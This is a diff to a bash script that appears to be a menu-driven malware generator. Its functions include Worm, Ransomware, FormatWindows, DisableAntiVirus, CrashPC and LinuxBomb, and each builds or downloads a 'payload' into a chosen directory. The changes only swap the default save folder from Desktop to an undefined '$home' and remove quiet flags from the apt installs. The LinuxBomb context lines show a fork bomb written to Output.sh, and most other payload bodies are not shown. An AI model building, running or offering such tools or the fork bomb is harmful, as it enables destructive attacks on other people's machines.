@@ -8,8 +8,8 @@ MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(prin
 RESETBG="$(printf '\e[0m\n')" YELLOW="$(printf '\033[1;33m')" GRAY="$(printf '\033[1;30m')"
 
 Need() {
-	command -v wget > /dev/null 2>&1 || { echo >&2 "${RED}I require wget but it's not installed. Waiting few seconds .." ; sudo apt install wget -y > /dev/null 2>&1 ; }
-	command -v figlet toilet > /dev/null 2>&1 || { echo >&2 "${RED}I require figlet toilet but it's not installed. Waiting few seconds .." ; sudo apt install figlet toilet -y > /dev/null 2>&1; }
+	command -v wget > /dev/null 2>&1 || { echo >&2 "${RED}I require wget but it's not installed. Waiting few seconds .." ; sudo apt install wget; }
+	command -v figlet toilet > /dev/null 2>&1 || { echo >&2 "${RED}I require figlet toilet but it's not installed. Waiting few seconds .." ; sudo apt install figlet toilet ; }
 }
 
 Menu() {
@@ -72,10 +72,10 @@ else
     clear ; Banner1 ; Banner2 ; Menu 
 fi
 }
-default_directory=~/Desktop
+default_directory=$home
 
 CmdLoop() {
-	read -p  "${ORANGE}Enter Directory(Default_Directory: Desktop): " save
+	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
 	save="${save:-${default_directory}}"
 	printf "${CYAN}Building Payload ....\n"
 	sleep 2
@@ -128,7 +128,7 @@ Worm() {
 }
 
 ReNameFile() {
-	read -p  "${ORANGE}Enter Directory(Default_Directory: Desktop): " save
+	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
 	save="${save:-${default_directory}}"
 	printf "${CYAN}Building Payload ....\n"
 	sleep 2
@@ -155,7 +155,7 @@ ReNameFile() {
 }
 
 FormatWindows() {
-	read -p  "${ORANGE}Enter Directory(Default_Directory: Desktop): " save
+	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
 	save="${save:-${default_directory}}"
 	printf "${CYAN}Building Payload ....\n"
 	sleep 3
@@ -203,7 +203,7 @@ Infect() {
 }
 
 LinuxBomb() {
-	read -p  "${ORANGE}Enter Directory(Default_Directory: Desktop): " save
+	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
 	save="${save:-${default_directory}}"
 	printf "${CYAN}Building Payload ....\n"
 	echo ":(){ :|: & };:" > $save/Output.sh
@@ -228,7 +228,7 @@ LinuxBomb() {
 }
 
 Invisible() {
-	read -p  "${ORANGE}Enter Directory(Default_Directory: Desktop): " save
+	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
 	save="${save:-${default_directory}}"
 	printf "${CYAN}Building Payload ....\n"
 	sleep 5
@@ -256,7 +256,7 @@ Invisible() {
 }
 
 InfectEXE() {
-	read -p  "${ORANGE}Enter Directory(Default_Directory: Desktop): " save
+	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
 	save="${save:-${default_directory}}"
 	printf "${CYAN}Building Payload ....\n"
 	sleep 3
@@ -282,7 +282,7 @@ InfectEXE() {
 }
 
 Cvirus() {
-	read -p  "${ORANGE}Enter Directory(Default_Directory: Desktop): " save
+	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
 	save="${save:-${default_directory}}"
 	printf "${CYAN}Downloading Payload ....\n"
 	sleep 3
@@ -309,7 +309,7 @@ Cvirus() {
 }
 
 DisableAntiVirus() {
-	read -p  "${ORANGE}Enter Directory(Default_Directory: Desktop): " save
+	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
 	save="${save:-${default_directory}}"
 	printf "${CYAN}Building Payload ....\n"
 	sleep 5
@@ -344,7 +344,7 @@ DisableAntiVirus() {
 }
 
 CrashPC() {
-	read -p  "${ORANGE}Enter Directory(Default_Directory: Desktop): " save
+	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
 	save="${save:-${default_directory}}"
 	printf "${CYAN}Building Payload ....\n"
 	sleep 5
@@ -375,7 +375,7 @@ CrashPC() {
 }
 
 Ransomware() {
-	read -p  "${ORANGE}Enter Directory(Default_Directory: Desktop): " save
+	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
 	save="${save:-${default_directory}}"
 	printf "${CYAN}Downloading Payload ....\n"
 	sleep 3
@@ -402,7 +402,7 @@ Ransomware() {
 }
 
 AlartLoop() {
-	read -p  "${ORANGE}Enter Directory(Default_Directory: Desktop): " save
+	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
 	save="${save:-${default_directory}}"
 	printf "${CYAN}Building Payload ....\n"
 	sleep 2
@@ -430,7 +430,7 @@ AlartLoop() {
 }
 
 DisableNet() {
-	read -p  "${ORANGE}Enter Directory(Default_Directory: Desktop): " save
+	read -p  "${ORANGE}Enter Directory(Default_Directory: Home): " save
 	save="${save:-${default_directory}}"
 	printf "${CYAN}Building Payload ....\n"
 	sleep 5
